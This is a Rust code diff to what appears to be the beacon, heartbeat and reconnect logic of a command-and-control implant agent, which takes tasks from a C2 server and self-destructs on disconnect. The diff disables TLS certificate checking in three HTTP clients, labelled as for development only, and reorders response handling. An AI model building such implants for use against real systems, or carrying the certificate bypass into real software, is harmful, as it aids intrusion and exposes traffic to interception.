@@ -25,6 +25,7 @@ pub async fn initial_beacon(
 
     let client = Client::builder()
         .timeout(Duration::from_secs(timeout))
+        .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
         .build()
         .unwrap();
 
@@ -99,6 +100,7 @@ pub async fn heartbeat(
 
     let client = Client::builder()
         .timeout(Duration::from_secs(timeout))
+        .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
         .build()
         .unwrap();
 
@@ -110,19 +112,24 @@ pub async fn heartbeat(
 
     match res {
         Ok(resp) => {
-            if resp.status().is_success() {
+            let status = resp.status();
+
+            if status.as_u16() == 204 {
+                logger.log("[*] Received NOOP from C2");
+                return Some(vec![AgentCommand::NOOP]);
+            } else if status.is_success() {
                 match resp.json::<ServerMessage>().await {
                     Ok(ServerMessage::Task { 
-                        agent_id, 
-                        session_id, 
+                        agent_id: _, 
+                        session_id: _, 
                         command 
                     }) => {
                         logger.log("[*] Received tasks from C2");
                         return Some(command)
                     }
                     Ok(ServerMessage::Disconnect { 
-                        agent_id, 
-                        session_id 
+                        agent_id: _, 
+                        session_id: _ 
                     }) => {
                         logger.log("[*] Received disconnect from C2");
                         return Some(vec![AgentCommand::SelfDestruct])
@@ -135,9 +142,6 @@ pub async fn heartbeat(
                         logger.error(&format!("[!] Beacon attempt failed: {}", e));
                     }
                 }
-            } else if resp.status().as_u16() == 204 {
-                logger.log("[*] Received NOOP from C2");
-                return Some(vec![AgentCommand::NOOP])
             } else {
                 logger.error(&format!(
                     "[!] Server responded with status: {}",
@@ -167,6 +171,7 @@ pub async fn reconnect(
 
     let client = Client::builder()
         .timeout(Duration::from_secs(timeout))
+        .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
         .build()
         .unwrap();
 
